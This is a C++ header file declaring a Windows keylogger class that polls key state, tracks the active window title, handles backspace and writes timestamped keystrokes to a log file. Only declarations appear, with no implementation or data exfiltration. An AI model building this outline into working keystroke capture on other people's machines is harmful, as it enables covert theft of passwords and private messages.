#pragma once

#include "keywatch/output/logger.hpp"
#include <atomic>
#include <chrono>
#include <string>
#include <thread>

namespace keywatch::app {

class Keylogger {
public:
  Keylogger(std::string log_path = "data.txt");
  ~Keylogger();

  // Blocks forever, polling key state. (Windows-only.)
  void run();

  // Gracefully stop the keylogger
  void stop();

private:
  void handle_backspace();
  std::string get_active_window_title() const;
  void log_with_timestamp(const std::string &text);

  std::string storage_;
  output::Logger logger_;
  std::atomic<bool> running_{true};
  std::chrono::steady_clock::time_point last_activity_;
  static constexpr int POLL_DELAY_MS = 10; // Reduce CPU usage
};

} // namespace keywatch::app
